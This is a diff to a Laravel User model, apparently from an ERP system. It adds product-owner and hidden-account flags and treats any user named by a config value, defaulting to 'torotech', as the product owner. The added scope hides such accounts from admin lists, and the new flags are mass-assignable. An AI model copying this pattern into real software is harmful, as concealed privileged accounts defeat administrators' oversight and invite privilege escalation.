@@ -35,6 +35,10 @@ class User extends Authenticatable
         'password',
         'role_id',
         'status',
+        'is_product_owner',
+        'is_hidden',
+        'last_login_at',
+        'force_password_change',
     ];
 
     protected $hidden = [
@@ -47,6 +51,10 @@ class User extends Authenticatable
         return [
             'password' => 'hashed',
             'activity_logs_last_read_at' => 'datetime',
+            'last_login_at' => 'datetime',
+            'is_product_owner' => 'boolean',
+            'is_hidden' => 'boolean',
+            'force_password_change' => 'boolean',
         ];
     }
 
@@ -100,5 +108,34 @@ class User extends Authenticatable
     public function scopeActive($query)
     {
         return $query->where('status', self::STATUS_ACTIVE);
+    }
+
+    public function isProductOwner(): bool
+    {
+        if ((bool) $this->is_product_owner) {
+            return true;
+        }
+
+        $expected = strtolower(trim((string) config('product_owner.username', 'torotech')));
+
+        return $expected !== ''
+            && strtolower(trim((string) ($this->username ?? ''))) === $expected;
+    }
+
+    public function isHiddenFromAdmin(): bool
+    {
+        return (bool) $this->is_hidden || $this->isProductOwner();
+    }
+
+    /** Exclude hidden product-owner and system accounts from ERP admin lists. */
+    public function scopeVisibleInAdmin($query)
+    {
+        return $query
+            ->where(function ($q) {
+                $q->where('is_hidden', false)->orWhereNull('is_hidden');
+            })
+            ->where(function ($q) {
+                $q->where('is_product_owner', false)->orWhereNull('is_product_owner');
+            });
     }
 }
